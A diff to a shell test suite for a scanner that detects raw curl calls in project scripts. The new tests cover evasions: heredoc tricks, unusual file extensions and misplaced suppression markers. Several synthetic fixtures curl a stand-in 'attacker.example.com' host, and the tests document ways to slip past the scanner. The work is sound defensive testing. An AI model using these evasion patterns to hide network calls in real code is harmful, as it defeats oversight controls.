@@ -214,6 +214,38 @@ curl https://real-violation.example
     }
 }
 
+# gp HIGH H1 (subagent review): a string literal containing `<<EOF` MUST NOT
+# put the scanner into heredoc state and silently swallow subsequent real
+# curl invocations. The opener regex must distinguish "real heredoc start"
+# from "string mention of <<EOF".
+@test "ST7e string mention of <<EOF does NOT swallow subsequent curl (gp H1)" {
+    _synth "string-heredoc-mention.sh" '#!/usr/bin/env bash
+echo "the example shows <<EOF style"
+curl https://attacker.example.com/evil
+'
+    run "$SCANNER" --root "$SYNTH_ROOT" --quiet
+    [[ "$status" -eq 1 ]] || {
+        printf 'string-mention of <<EOF should not swallow later curl; status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
+}
+
+# gp HIGH H2 (subagent review): a heredoc opener on the SAME line as a curl
+# invocation (e.g., `cat <<EOF >x && curl https://x`) — the opener consumes
+# the line via awk `next`, dropping the curl from inspection. Tighten so
+# that same-line curl after `&&` / `||` / `;` is still scanned.
+@test "ST7f heredoc opener same-line as curl IS flagged (gp H2)" {
+    _synth "same-line-opener.sh" '#!/usr/bin/env bash
+cat <<EOF >file.txt && curl https://attacker.example.com/evil
+EOF
+'
+    run "$SCANNER" --root "$SYNTH_ROOT" --quiet
+    [[ "$status" -eq 1 ]] || {
+        printf 'same-line opener+curl should be flagged; status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
+}
+
 # ---------------------------------------------------------------------------
 # ST8 — explicit suppression marker (escape hatch).
 # ---------------------------------------------------------------------------
@@ -277,17 +309,91 @@ curl \
 # match, not by content).
 # ---------------------------------------------------------------------------
 
-@test "ST12 the 3 exempt files load and pass scan via real-tree run" {
+@test "ST12 the 4 exempt files load and pass scan via real-tree run" {
     cd "$PROJECT_ROOT"
-    # All 3 files exist in the real tree; ST1 already verifies the tree
+    # All 4 files exist in the real tree; ST1 already verifies the tree
     # passes. Here we additionally pin that the exemption list contains
-    # exactly those three paths.
+    # exactly those four paths.
     grep -qF '.claude/scripts/lib/endpoint-validator.sh' "$SCANNER"
     grep -qF '.claude/scripts/mount-loa.sh' "$SCANNER"
     grep -qF '.claude/scripts/model-health-probe.sh' "$SCANNER"
+    grep -qF '.claude/scripts/model-adapter.sh.legacy' "$SCANNER"
     [[ -f .claude/scripts/lib/endpoint-validator.sh ]]
     [[ -f .claude/scripts/mount-loa.sh ]]
     [[ -f .claude/scripts/model-health-probe.sh ]]
+    [[ -f .claude/scripts/model-adapter.sh.legacy ]]
+}
+
+# ---------------------------------------------------------------------------
+# cypherpunk C1: scanner extension blindness. *.sh-only glob misses .bash,
+# .legacy, and bash-shebang scripts with no extension. The legacy file
+# .claude/scripts/model-adapter.sh.legacy contains 3 live raw curl calls and
+# is actively dispatched by model-adapter.sh.
+# ---------------------------------------------------------------------------
+
+@test "ST14 scanner sees raw curl in .legacy file (cypherpunk C1)" {
+    _synth "violator.sh.legacy" '#!/usr/bin/env bash
+curl -s --max-time 30 https://api.openai.com/v1/chat/completions
+'
+    run "$SCANNER" --root "$SYNTH_ROOT" --quiet
+    [[ "$status" -eq 1 ]] || {
+        printf 'scanner blind to .legacy files; status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
+}
+
+@test "ST14b scanner sees raw curl in .bash file (cypherpunk M2)" {
+    _synth "violator.bash" '#!/usr/bin/env bash
+curl -fsSL https://attacker.example.com/x
+'
+    run "$SCANNER" --root "$SYNTH_ROOT" --quiet
+    [[ "$status" -eq 1 ]] || {
+        printf 'scanner blind to .bash files; status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
+}
+
+@test "ST14c scanner sees raw curl in extension-less bash-shebang script (cypherpunk C1)" {
+    _synth "violator-no-ext" '#!/usr/bin/env bash
+curl https://attacker.example.com/x
+'
+    run "$SCANNER" --root "$SYNTH_ROOT" --quiet
+    [[ "$status" -eq 1 ]] || {
+        printf 'scanner blind to extension-less scripts; status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
+}
+
+@test "ST14d scanner ignores extension-less files WITHOUT bash shebang" {
+    # Avoid noise: a binary or non-bash extension-less file shouldn't be
+    # treated as a script. Defense against scanning README, LICENSE, etc.
+    _synth "README-like" 'This document mentions curl in passing.
+You can use curl https://example.com to fetch data.
+'
+    run "$SCANNER" --root "$SYNTH_ROOT" --quiet
+    [[ "$status" -eq 0 ]] || {
+        printf 'scanner should not flag non-script files; status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
+}
+
+# ---------------------------------------------------------------------------
+# cypherpunk H2: suppression marker should only silence the SAME line. A
+# marker on line N must not silence a curl on line N+1 (and vice versa).
+# ---------------------------------------------------------------------------
+
+@test "ST15 suppression marker silences ONLY the marked line, not surrounding" {
+    _synth "marker-scope.sh" '#!/usr/bin/env bash
+# Real bypass below; marker on different line must NOT silence it.
+# check-no-raw-curl: ok (this is a bare comment that should not silence anything)
+curl https://attacker.example.com/evil
+'
+    run "$SCANNER" --root "$SYNTH_ROOT" --quiet
+    # Bare-comment markers (not on a curl line) should NOT silence other lines
+    [[ "$status" -eq 1 ]] || {
+        printf 'marker on a non-curl line should not silence later curl; status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
 }
 
 # ---------------------------------------------------------------------------
